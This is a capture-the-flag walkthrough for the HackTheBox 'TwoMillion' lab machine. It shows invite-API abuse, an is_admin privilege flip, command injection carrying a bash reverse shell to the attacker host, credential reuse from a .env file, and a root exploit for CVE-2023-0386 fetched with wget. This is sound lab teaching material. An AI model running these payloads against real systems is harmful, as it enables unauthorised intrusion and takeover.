# HackTheBox: TwoMillion - Full Walkthrough

**Machine IP:** `10.129.24.18`  
**Difficulty:** Easy  
**OS:** Linux  
**Date:** June 12, 2026

---

## 1. Initial Enumeration

### Nmap Scan
```bash
nmap -sT --open -T4 10.129.24.18
```
**Results:**
- **Port 22:** SSH
- **Port 80:** HTTP (Redirects to `2million.htb`)

### Virtual Host Setup
Add the IP to your `/etc/hosts` file:
```text
10.129.24.18 2million.htb
```

---

## 2. Exploiting the Invite System

1. **Accessing /invite:** Navigating to `http://2million.htb/invite` reveals an invite code requirement.
2. **Finding the API:** Inspecting the page source shows a script called `/js/inviteapi.min.js`.
3. **Deobfuscating JavaScript:** The script contains two interesting functions: `makeInviteCode` and `verifyInviteCode`.
4. **Getting the Hint:** Calling `makeInviteCode()` in the browser console makes a POST request to `/api/v1/invite/how/to/generate`.
5. **Decryption:** The response returns encrypted data with `enctype: ROT13`. Decrypting it provides a new endpoint: `/api/v1/invite/generate`.
6. **Generating the Code:** Making a POST request to `/api/v1/invite/generate` returns a Base64 encoded code.
   - **Example:** `U0tIUjAtS1Y3Wk0tNEdGOVgtS1BZVkg=` -> `SKHR0-KV7ZM-4GF9X-KPYVH`

---

## 3. Foothold (Reverse Shell)

1. **API Enumeration:** After logging in, you can find a list of API endpoints at `/api/v1`.
2. **Administrative Access:** By making a `PUT` request to `/api/v1/admin/settings/update` with the payload `{"is_admin": 1}`, you can escalate your web account to Admin.
3. **Command Injection:** The endpoint `/api/v1/admin/vpn/generate` is vulnerable to command injection via the `username` parameter.
4. **Getting a Shell:**
   ```bash
   # Payload
   ; bash -c 'bash -i >& /dev/tcp/10.10.14.106/9001 0>&1' #
   ```
5. **Lateral Movement:** In `/var/www/html/.env`, we find database credentials:
   - **DB_PASSWORD:** `SuperDuperPass123`
6. **SSH Access:** Use these credentials to SSH into the machine as the `admin` user.
   ```bash
   ssh admin@2million.htb
   # Password: SuperDuperPass123
   ```
   **User Flag:** `7b24e7b3a15d56aa28be749bad8e0b07`

---

## 4. Privilege Escalation to Root

### Enumeration
Checking the system mail (`cat /var/mail/admin`) mentions recent kernel vulnerabilities. `uname -a` confirms kernel version `5.15.70`.

### Exploit: CVE-2023-0386 (OverlayFS)
1. **Transfer:** Download the exploit to the target.
   ```bash
   cd /tmp
   wget http://<YOUR_IP>:8000/CVE-2023-0386-master.zip
   unzip CVE-2023-0386-master.zip
   cd CVE-2023-0386-master/
   ```
2. **Build:**
   ```bash
   make all
   ```
3. **Execution:**
   - **Step 1:** Start the FUSE server in the background:
     ```bash
     ./fuse ./ovlcap/lower ./gc &
     ```
   - **Step 2:** Run the trigger:
     ```bash
     ./exp
     ```
4. **Root Access:** The exploit drops you into a root shell.

**Root Flag:** `128d99d968f8420f7de758f12b6bd66d`

---

## 5. Alternative Exploit (Looney Tunables)
The machine is also vulnerable to **CVE-2023-4911**. 
- **Environment Variable:** `GLIBC_TUNABLES`
- **Mechanism:** Buffer overflow in `ld.so`.
- **GLIBC Version:** `2.35`
